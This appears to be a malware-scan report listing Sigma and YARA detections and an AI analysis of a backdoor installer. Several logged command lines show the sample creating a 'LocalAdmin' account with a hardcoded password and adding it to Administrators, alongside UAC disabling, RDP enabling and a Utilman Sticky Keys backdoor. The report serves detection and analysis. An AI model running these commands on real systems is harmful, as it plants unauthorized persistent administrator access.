crowdsourced_yara_results.author: @bartblaze

sigma_analysis_results.rule_title: Suspicious Manipulation Of Default Accounts Via Net.EXE
sigma_analysis_results.rule_description: Detects suspicious manipulations of default accounts such as 'administrator' and 'guest'. For example 'enable' or 'disable' accounts or change the password...etc

values.ParentCommandLine: C:\Windows\System32\cmd.exe /c C:&cd\&cd windows&cd system32&net user LocalAdmin Security1215! /add&net user LocalAdmin /FULLNAME:"Local Administrator Account" /COMMENT:"A user account managed by the Local System." /EXPIRES:NEVER /Active:YES&net localgroup users LocalAdmin /delete&net localgroup Administrators LocalAdmin /add&net localgroup "Network Configuration Operators" LocalAdmin /add&exit
values.CommandLine: net  user LocalAdmin /FULLNAME:"Local Administrator Account" /COMMENT:"A user account managed by the Local System." /EXPIRES:NEVER /Active:YES

values.ParentCommandLine: net  user LocalAdmin /FULLNAME:"Local Administrator Account" /COMMENT:"A user account managed by the Local System." /EXPIRES:NEVER /Active:YES

sigma_analysis_results.rule_title: Enable LM Hash Storage
sigma_analysis_results.rule_description:
Detects changes to the "NoLMHash" registry value in order to allow Windows to store LM Hashes.
By setting this registry value to "0" (DWORD), Windows will be allowed to store a LAN manager hash of your password in Active Directory and local SAM databases.

sigma_analysis_results.rule_title: Python Initiated Connection
sigma_analysis_results.rule_description: Adversaries may attempt to get a listing of services running on remote hosts, including those that may be vulnerable to remote software exploitation

sigma_analysis_results.rule_title: User Added to Local Administrator Group
sigma_analysis_results.rule_description: Detects the addition of a new member to the local administrator group, which could be legitimate activity or a sign of privilege escalation activity

sigma_analysis_results.rule_title: Suspicious Reconnaissance Activity
sigma_analysis_results.rule_description: Detects suspicious command line activity on Windows systems

values.CommandLine: C:\Windows\System32\cmd.exe /c C:&cd\&cd windows&cd system32&net user LocalAdmin Security1215! /add&net user LocalAdmin /FULLNAME:"Local Administrator Account" /COMMENT:"A user account managed by the Local System." /EXPIRES:NEVER /Active:YES&net localgroup users LocalAdmin /delete&net localgroup Administrators LocalAdmin /add&net localgroup "Network Configuration Operators" LocalAdmin /add&exit
values.ParentCommandLine: "file000_utilman.exe"

sigma_analysis_results.rule_title: UAC Disabled
sigma_analysis_results.rule_description: Detects when an attacker tries to disable User Account Control (UAC) by setting the registry value "EnableLUA" to 0.

sigma_analysis_results.rule_title: New User Created Via Net.EXE
sigma_analysis_results.rule_description: Identifies the creation of local users via the net.exe command.
sigma_analysis_results.rule_author: Endgame, JHasenbusch (adapted to Sigma for oscd.community)

values.ParentCommandLine: C:\Windows\System32\cmd.exe /c C:&cd\&cd windows&cd system32&net user LocalAdmin Security1215! /add&net user LocalAdmin /FULLNAME:"Local Administrator Account" /COMMENT:"A user account managed by the Local System." /EXPIRES:NEVER /Active:YES&net localgroup users LocalAdmin /delete&net localgroup Administrators LocalAdmin /add&net localgroup "Network Configuration Operators" LocalAdmin /add&exit
net  user LocalAdmin Security1215! /add

sigma_analysis_results.rule_title: RDP Sensitive Settings Changed to Zero
sigma_analysis_results.rule_description:
Detects tampering of RDP Terminal Service/Server sensitive settings.
Such as allowing unauthorized users access to a system via the 'fAllowUnsolicited' or enabling RDP via 'fDenyTSConnections', etc.
sigma_analysis_results.rule_author: Samir Bousseaden, David ANDRE, Roberto Rodriguez @Cyb3rWard0g, Nasreddine Bencherchali

sigma_analysis_results.rule_title: User Added to Local Administrators Group
sigma_analysis_results.rule_description: Detects addition of users to the local administrator group via "Net" or "Add-LocalGroupMember".
sigma_analysis_results.rule_author: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)

values.ParentCommandLine: C:\Windows\System32\cmd.exe /c C:&cd\&cd windows&cd system32&net user LocalAdmin Security1215! /add&net user LocalAdmin /FULLNAME:"Local Administrator Account" /COMMENT:"A user account managed by the Local System." /EXPIRES:NEVER /Active:YES&net localgroup users LocalAdmin /delete&net localgroup Administrators LocalAdmin /add&net localgroup "Network Configuration Operators" LocalAdmin /add&exit

sigma_analysis_results.rule_description: Detects local user creation on Windows servers, which shouldn't happen in an Active Directory environment. Apply this Sigma Use Case on your Windows server logs and not on your DC logs.

crowdsourced_ai_results.analysis: This is a backdoor installer that establishes persistence and remote access. It creates a new administrative user named 'LocalAdmin' with a hardcoded password 'Security1215!' and then hides this account from the login screen. The malware also enables Remote Desktop (RDP) and weakens system security by disabling User Account Control (UAC) via registry modifications. Furthermore, it achieves persistence by replacing the 'Utilman.exe' (Ease of Access) utility with itself, a technique known as a 'Sticky Keys' backdoor, allowing it to be launched with SYSTEM privileges from the login screen.

sigma_analysis_results.rule_title: Suspicious Manipulation Of Default Accounts Via Net.EXE
sigma_analysis_results.rule_description: Detects suspicious manipulations of default accounts such as 'administrator' and 'guest'. For example 'enable' or 'disable' accounts or change the password...etc

sigma_analysis_results.rule_title: User Added to Local Administrators
sigma_analysis_results.rule_description: This rule triggers on user accounts that are added to the local Administrators group, which could be legitimate activity or a sign of privilege escalation activity

sigma_analysis_results.rule_title: User Added to Local Administrator Group
sigma_analysis_results.rule_description: Detects the addition of a new member to the local administrator group, which could be legitimate activity or a sign of privilege escalation activity

sigma_analysis_results.rule_title: Local User Creation
sigma_analysis_results.rule_description: Detects local user creation on Windows servers, which shouldn't happen in an Active Directory environment. Apply this Sigma Use Case on your Windows server logs and not on your DC logs.

crowdsourced_yara_results.description: Detects PE Type babyShark loader mentioned in February 2019 blog post by PaloAltNetworks
crowdsourced_yara_results.author: Florian Roth (Nextron Systems)

crowdsourced_ai_results.analysis: This is a backdoor installer that establishes persistence and remote access. It creates a new administrative user named 'LocalAdmin' with a hardcoded password 'Security1215!' and then hides this account from the login screen. The malware also enables Remote Desktop (RDP) and weakens system security by disabling User Account Control (UAC) via registry modifications. Furthermore, it achieves persistence by replacing the 'Utilman.exe' (Ease of Access) utility with itself, a technique known as a 'Sticky Keys' backdoor, allowing it to be launched with SYSTEM privileges from the login screen.
